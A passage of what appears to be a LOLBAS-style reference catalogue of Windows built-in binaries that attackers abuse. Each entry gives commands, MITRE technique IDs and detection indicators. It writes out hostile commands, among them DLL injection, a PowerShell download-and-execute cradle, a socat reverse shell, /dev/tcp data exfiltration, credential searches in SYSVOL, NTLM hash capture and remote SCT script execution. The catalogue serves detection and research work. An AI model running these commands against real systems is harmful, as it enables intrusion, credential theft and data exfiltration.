            ],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://web.archive.org/web/20160322142537/https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/"
                },
                {
                    "Link": "https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/"
                },
                {"Link": "https://twitter.com/harr0ey/status/991338229952598016"},
            ],
            "Acknowledgement": [{"Person": None, "Handle": None}],
            "pname": "msdt",
        },
        {
            "Name": "Rasautou.exe",
            "Description": "Windows Remote Access Dialer",
            "Author": "Tony Lambert",
            "Created": "2020-01-10",
            "Commands": [
                {
                    "Command": "rasautou -d powershell.dll -p powershell -a a -e e",
                    "Description": "Loads the target .DLL specified in -d and executes the export specified in -p. Options removed in Windows 10.",
                    "Usecase": "Execute DLL code",
                    "Category": "Execute",
                    "Privileges": "User, Administrator in Windows 8",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1",
                }
            ],
            "Full_Path": [{"Path": "C:\\Windows\\System32\\rasautou.exe"}],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "rasautou.exe command line containing -d and -p"}],
            "Resources": [
                {"Link": "https://github.com/fireeye/DueDLLigence"},
                {
                    "Link": "https://www.fireeye.com/blog/threat-research/2019/10/staying-hidden-on-the-endpoint-evading-detection-with-shellcode.html"
                },
            ],
            "Acknowledgement": [{"Person": "FireEye", "Handle": "AT_SYMBOLFireEye"}],
            "pname": "rasautou",
        },
        {
            "Name": "Mavinject.exe",
            "Description": "Used by App-v in Windows",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "MavInject.exe 3110 /INJECTRUNNING c:\\folder\\evil.dll",
                    "Description": "Inject evil.dll into a process with PID 3110.",
                    "Usecase": "Inject dll file into running process",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'Mavinject.exe 4172 /INJECTRUNNING "c:\\ads\\file.txt:file.dll"',
                    "Description": "Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172",
                    "Usecase": "Inject dll file into running process",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\mavinject.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\mavinject.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {
                    "IOC": "mavinject.exe should not run unless APP-v is in use on the workstation"
                }
            ],
            "Resources": [
                {"Link": "https://twitter.com/gN3mes1s/status/941315826107510784"},
                {"Link": "https://twitter.com/Hexcorn/status/776122138063409152"},
                {
                    "Link": "https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/"
                },
            ],
            "Acknowledgement": [
                {"Person": "Giuseppe N3mes1s", "Handle": "AT_SYMBOLgN3mes1s"},
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"},
            ],
            "pname": "mavinject",
        },
        {
            "Name": "Ilasm.exe",
            "Description": "used for compile c# code into dll or exe.",
            "Author": "Hai vaknin (lux)",
            "Created": "17/03/2020",
            "Commands": [
                {
                    "Command": "ilasm.exe C:\\public\\test.txt /exe",
                    "Description": "Binary file used by .NET to compile c# code to .exe",
                    "Usecase": "Compile attacker code on system. Bypass defensive counter measures.",
                    "Category": "Compile",
                    "Privileges": "User",
                    "MitreID": "T1127",
                    "MitreLink": "https://attack.mitre.org/techniques/T1127/",
                    "OperatingSystem": "Windows 10,7",
                },
                {
                    "Command": "ilasm.exe C:\\public\\test.txt /dll",
                    "Description": "Binary file used by .NET to compile c# code to dll",
                    "Usecase": "A description of the usecase",
                    "Category": "Compile",
                    "Privileges": "User",
                    "MitreID": "T1127",
                    "MitreLink": "https://attack.mitre.org/techniques/T1127/",
                    "OperatingSystem": "Not specified",
                },
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ilasm.exe"
                },
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ilasm.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Resources": [
                {
                    "Link": "https://github.com/LuxNoBulIshit/BeforeCompileBy-ilasm/blob/master/hello_world.txt"
                }
            ],
            "Acknowledgement": [
                {"Person": "Hai Vaknin(Lux)", "Handle": "AT_SYMBOLVakninHai"},
                {"Person": "Lior Adar", "Handle": None},
            ],
            "pname": "ilasm",
        },
        {
            "Name": "DataSvcUtil.exe",
            "Description": "DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.",
            "Author": "Ialle Teixeira",
            "Created": "01/12/2020",
            "Commands": [
                {
                    "Command": "DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile",
                    "Description": "Upload file, credentials or data exfiltration in general",
                    "Usecase": "Upload file",
                    "Category": "Upload",
                    "Privileges": "User",
                    "MitreID": "T1567",
                    "MitreLink": "https://attack.mitre.org/techniques/T1567/",
                    "OperatingSystem": "Windows 10",
                }
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\DataSvcUtil.exe"
                }
            ],
            "Code_Sample": [
                {
                    "Code": "https://gist.github.com/teixeira0xfffff/837e5bfed0d1b0a29a7cb1e5dbdd9ca6"
                }
            ],
            "Detection": [
                {
                    "IOC": "The DataSvcUtil.exe tool is installed in the .NET Framework directory."
                },
                {
                    "IOC": "Preventing/Detecting DataSvcUtil with non-RFC1918 addresses by Network IPS/IDS."
                },
                {
                    "IOC": "Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching DataSvcUtil."
                },
            ],
            "Resources": [
                {
                    "Link": "https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe"
                },
                {
                    "Link": "https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/generating-the-data-service-client-library-wcf-data-services"
                },
                {
                    "Link": "https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/how-to-add-a-data-service-reference-wcf-data-services"
                },
            ],
            "Acknowledgement": [
                {"Person": "Ialle Teixeira", "Handle": "AT_SYMBOLNtSetDefault"}
            ],
            "pname": "datasvcutil",
        },
        {
            "Name": "Findstr.exe",
            "Description": None,
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\file.exe > c:\\ADS\\file.txt:file.exe",
                    "Description": "Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.",
                    "Usecase": "Add a file to an alternate data stream to hide from defensive counter measures",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "findstr /V /L W3AllLov3DonaldTrump \\\\webdavserver\\folder\\file.exe > c:\\ADS\\file.txt:file.exe",
                    "Description": "Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.",
                    "Usecase": "Add a file to an alternate data stream from a webdav server to hide from defensive counter measures",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "findstr /S /I cpassword \\\\sysvol\\policies\\*.xml",
                    "Description": "Search for stored password in Group Policy files stored on SYSVOL.",
                    "Usecase": "Find credentials stored in cpassword attrbute",
                    "Category": "Credentials",
                    "Privileges": "User",
                    "MitreID": "T1081",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1081",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "findstr /V /L W3AllLov3DonaldTrump \\\\webdavserver\\folder\\file.exe > c:\\ADS\\file.exe",
                    "Description": "Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is downloaded to the target file.",
                    "Usecase": "Download/Copy file from webdav server",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1185",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1185",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\findstr.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\findstr.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "finstr.exe should normally not be invoked on a client system"}
            ],
            "Resources": [
                {
                    "Link": "https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/"
                },
                {
                    "Link": "https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f"
                },
            ],
            "Acknowledgement": [
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"}
            ],
            "pname": "findstr",
        },
        {
            "Name": "SyncAppvPublishingServer.exe",
            "Description": "Used by App-v to get App-v server lists",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "SyncAppvPublishingServer.exe \"n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX\"",
                    "Description": "Example command on how inject Powershell code into the process",
                    "Usecase": "Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 10 1709, Windows 10 1703, Windows 10 1607",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\SyncAppvPublishingServer.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\SyncAppvPublishingServer.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {
                    "IOC": "SyncAppvPublishingServer.exe should never be in use unless App-V is deployed"
                }
            ],
            "Resources": [
                {"Link": "https://twitter.com/monoxgas/status/895045566090010624"}
            ],
            "Acknowledgement": [
                {"Person": "Nick Landers", "Handle": "AT_SYMBOLmonoxgas"}
            ],
            "pname": "syncappvpublishingserver",
        },
        {
            "Name": "Rpcping.exe",
            "Description": "Used to verify rpc connection",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM",
                    "Description": "Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.",
                    "Usecase": "Capture credentials on a non-standard port",
                    "Category": "Credentials",
                    "Privileges": "User",
                    "MitreID": "T1003",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1003",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\rpcping.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\rpcping.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://github.com/vysec/RedTips"},
                {"Link": "https://twitter.com/vysecurity/status/974806438316072960"},
                {"Link": "https://twitter.com/vysecurity/status/873181705024266241"},
            ],
            "Acknowledgement": [
                {"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"},
                {"Person": "Vincent Yiu", "Handle": "AT_SYMBOLvysecurity"},
            ],
            "pname": "rpcping",
        },
        {
            "Name": "Verclsid.exe",
            "Description": None,
            "Author": "AT_SYMBOLbohops",
            "Created": "2018-12-04",
            "Commands": [
                {
                    "Command": "verclsid.exe /S /C {CLSID}",
                    "Description": "Used to verify a COM object before it is instantiated by Windows Explorer",
                    "Usecase": "Run a com object created in registry to evade defensive counter measures",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\verclsid.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\verclsid.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5"
                },
                {
                    "Link": "https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/"
                },
            ],
            "Acknowledgement": [
                {"Person": "Nick Tyrer", "Handle": "AT_SYMBOLNickTyrer"}
            ],
            "pname": "verclsid",
        },
        {
            "Name": "Hh.exe",
            "Description": "Binary used for processing chm files in Windows",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "HH.exe http://some.url/script.ps1",
                    "Description": "Open the target PowerShell script with HTML Help.",
                    "Usecase": "Download files from url",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "HH.exe c:\\windows\\system32\\calc.exe",
                    "Description": "Executes calc.exe with HTML Help.",
                    "Usecase": "Execute process with HH.exe",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1216",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\hh.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\hh.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "hh.exe should normally not be in use on a normal workstation"}
            ],
            "Resources": [
                {
                    "Link": "https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/"
                }
            ],
            "Acknowledgement": [
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"}
            ],
            "pname": "hh",
        },
        {
            "Name": "Odbcconf.exe",
            "Description": "Used in Windows for managing ODBC connections",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "odbcconf -f file.rsp",
                    "Description": "Load DLL specified in target .RSP file. See the Playloads folder for an example .RSP file.",
                    "Usecase": "Execute dll file using technique that can evade defensive counter measures",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "odbcconf /a {REGSVR c:\\test\\test.dll}",
                    "Description": "Execute DllREgisterServer from DLL specified.",
                    "Usecase": "Execute dll file using technique that can evade defensive counter measures",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\odbcconf.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\odbcconf.exe"},
            ],
            "Code_Sample": [
                {
                    "Code": "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/file.rsp"
                }
            ],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b"
                },
                {
                    "Link": "https://github.com/woanware/application-restriction-bypasses"
                },
                {"Link": "https://twitter.com/Hexacorn/status/1187143326673330176"},
            ],
            "Acknowledgement": [
                {"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"},
                {"Person": "Adam", "Handle": "AT_SYMBOLHexacorn"},
            ],
            "pname": "odbcconf",
        },
        {
            "Name": "Msconfig.exe",
            "Description": "MSConfig is a troubleshooting tool which is used to temporarily disable or re-enable software, device drivers or Windows services that run during startup process to help the user determine the cause of a problem with Windows",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "Msconfig.exe -5",
                    "Description": "Executes command embeded in crafted c:\\windows\\system32\\mscfgtlc.xml.",
                    "Usecase": "Code execution using Msconfig.exe",
                    "Category": "Execute",
                    "Privileges": "Administrator",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [{"Path": "C:\\Windows\\System32\\msconfig.exe"}],
            "Code_Sample": [
                {
                    "Code": "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/mscfgtlc.xml"
                }
            ],
            "Detection": [
                {"IOC": "mscfgtlc.xml changes in system32 folder"},
                {"IOC": "msconfig.exe executing"},
            ],
            "Resources": [
                {"Link": "https://twitter.com/pabraeken/status/991314564896690177"}
            ],
            "Acknowledgement": [
                {"Person": "Pierre-Alexandre Braeken", "Handle": "AT_SYMBOLpabraeken"}
            ],
            "pname": "msconfig",
        },
        {
            "Name": "Forfiles.exe",
            "Description": "Selects and executes a command on a file or set of files. This command is useful for batch processing.",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe",
                    "Description": "Executes calc.exe since there is a match for notepad.exe in the c:\\windows\\System32 folder.",
                    "Usecase": "Use forfiles to start a new process to evade defensive counter measures",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'forfiles /p c:\\windows\\system32 /m notepad.exe /c "c:\\folder\\normal.dll:evil.exe"',
                    "Description": "Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the c:\\windows\\system32 folder.",
                    "Usecase": "Use forfiles to start a new process from a binary hidden in an alternate data stream",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\forfiles.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\forfiles.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/vector_sec/status/896049052642533376"},
                {
                    "Link": "https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f"
                },
                {
                    "Link": "https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/"
                },
            ],
            "Acknowledgement": [
                {"Person": "Eric", "Handle": "AT_SYMBOLvector_sec"},
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"},
            ],
            "pname": "forfiles",
        },
        {
            "Name": "Ie4uinit.exe",
            "Description": None,
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "ie4uinit.exe -BaseSettings",
                    "Description": "Executes commands from a specially prepared ie4uinit.inf file.",
                    "Usecase": "Get code execution by copy files to another location",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "c:\\windows\\system32\\ie4uinit.exe"},
                {"Path": "c:\\windows\\sysWOW64\\ie4uinit.exe"},
                {"Path": "c:\\windows\\system32\\ieuinit.inf"},
                {"Path": "c:\\windows\\sysWOW64\\ieuinit.inf"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "ie4uinit.exe loading a inf file from outside %windir%"}
            ],
            "Resources": [
                {
                    "Link": "https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/"
                }
            ],
            "Acknowledgement": [{"Person": "Jimmy", "Handle": "AT_SYMBOLbohops"}],
            "pname": "ie4uinit",
        },
        {
            "Name": "Expand.exe",
            "Description": "Binary that expands one or more compressed files",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.bat",
                    "Description": "Copies source file to destination.",
                    "Usecase": "Use to copies the source file to the destination file",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "expand c:\\ADS\\file1.bat c:\\ADS\\file2.bat",
                    "Description": "Copies source file to destination.",
                    "Usecase": "Copies files from A to B",
                    "Category": "Copy",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.txt:file.bat",
                    "Description": "Copies source file to destination Alternate Data Stream (ADS)",
                    "Usecase": "Copies files from A to B",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\Expand.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\Expand.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/infosecn1nja/status/986628482858807297"},
                {"Link": "https://twitter.com/Oddvarmoe/status/986709068759949319"},
            ],
            "Acknowledgement": [
                {"Person": "Rahmat Nurfauzi", "Handle": "AT_SYMBOLinfosecn1nja"},
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"},
            ],
            "pname": "expand",
        },
        {
            "Name": "Desktopimgdownldr.exe",
            "Description": "Windows binary used to configure lockscreen/desktop image",
            "Author": "Gal Kristal",
            "Created": "28/06/2020",
            "Commands": [
                {
                    "Command": 'set "SYSTEMROOT=C:\\Windows\\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr',
                    "Description": "Downloads the file and sets it as the computer's lockscreen",
                    "Usecase": "Download arbitrary files from a web server",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/techniques/T1105/",
                    "OperatingSystem": "Windows 10",
                }
            ],
            "Full_Path": [{"Path": "c:\\windows\\system32\\desktopimgdownldr.exe"}],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "desktopimgdownldr.exe that creates non-image file"},
                {
                    "IOC": "Change of HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP\\LockScreenImageUrl"
                },
            ],
            "Resources": [
                {
                    "Link": "https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/"
                }
            ],
            "Acknowledgement": [
                {"Person": "Gal Kristal", "Handle": "AT_SYMBOLgal_kristal"}
            ],
            "pname": "desktopimgdownldr",
        },
        {
            "Name": "Xwizard.exe",
            "Description": None,
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}",
                    "Description": "Xwizard.exe running a custom class that has been added to the registry.",
                    "Usecase": "Run a com object created in registry to evade defensive counter measures",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}",
                    "Description": "Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.",
                    "Usecase": "Run a com object created in registry to evade defensive counter measures",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM",
                    "Description": "Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file.",
                    "Usecase": "Download file from Internet",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\xwizard.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\xwizard.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/"
                },
                {"Link": "https://www.youtube.com/watch?v=LwDHX7DVHWU"},
                {
                    "Link": "https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5"
                },
                {
                    "Link": "https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/"
                },
                {"Link": "https://twitter.com/notwhickey/status/1306023056847110144"},
            ],
            "Acknowledgement": [
                {"Person": "Adam", "Handle": "AT_SYMBOLHexacorn"},
                {"Person": "Nick Tyrer", "Handle": "AT_SYMBOLNickTyrer"},
                {"Person": "harr0ey", "Handle": "AT_SYMBOLharr0ey"},
                {"Person": "Wade Hickey", "Handle": "AT_SYMBOLnotwhickey"},
            ],
            "pname": "xwizard",
        },
        {
            "Name": "Bash.exe",
            "Description": "File used by Windows subsystem for Linux",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "bash.exe -c calc.exe",
                    "Description": "Executes calc.exe from bash.exe",
                    "Usecase": "Performs execution of specified file, can be used as a defensive evasion.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 10",
                },
                {
                    "Command": 'bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"',
                    "Description": "Executes a reverseshell",
                    "Usecase": "Performs execution of specified file, can be used as a defensive evasion.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 10",
                },
                {
                    "Command": "bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24'",
                    "Description": "Exfiltrate data",
                    "Usecase": "Performs execution of specified file, can be used as a defensive evasion.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 10",
                },
                {
                    "Command": "bash.exe -c calc.exe",
                    "Description": "Executes calc.exe from bash.exe",
                    "Usecase": "Performs execution of specified file, can be used to bypass Application Whitelisting.",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\bash.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\bash.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "Child process from bash.exe"}],
            "Resources": [
                {
                    "Link": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
                }
            ],
            "Acknowledgement": [
                {"Person": "Alex Ionescu", "Handle": "AT_SYMBOLaionescu"},
                {"Person": "Asif Matadar", "Handle": "AT_SYMBOLd1r4c"},
            ],
            "pname": "bash",
        },
        {
            "Name": "Regsvr32.exe",
            "Description": "Used by Windows to register dlls",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll",
                    "Description": "Execute the specified remote .SCT script with scrobj.dll.",
